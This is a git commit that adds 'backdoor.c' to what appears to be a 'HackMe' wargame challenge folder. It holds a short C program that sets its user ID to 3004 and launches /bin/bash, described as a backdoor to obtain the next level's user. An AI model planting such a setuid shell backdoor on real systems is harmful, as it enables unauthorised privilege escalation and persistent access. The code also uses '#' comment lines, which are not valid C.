fb7b13b909325808c72d7a6a1ce82e8b77856964
Harkjin.dev <harkjin.dev@gmail.com>
2021-06-04 15:07:18 +0900

    Create backdoor.c

---
+++ Reverse/HackMe/Level3/backdoor.c
@@ -0,0 +1,12 @@
+# Description
+# This is backdoor to get level4 uid
+
+int main()
+{
+	char *cmd[2]; 
+	cmd[0]="/bin/bash";
+	cmd[1]=(void *)0;
+
+	setreuid(3004,3004);
+	execve(cmd[0], cmd, cmd[1]);   
+}
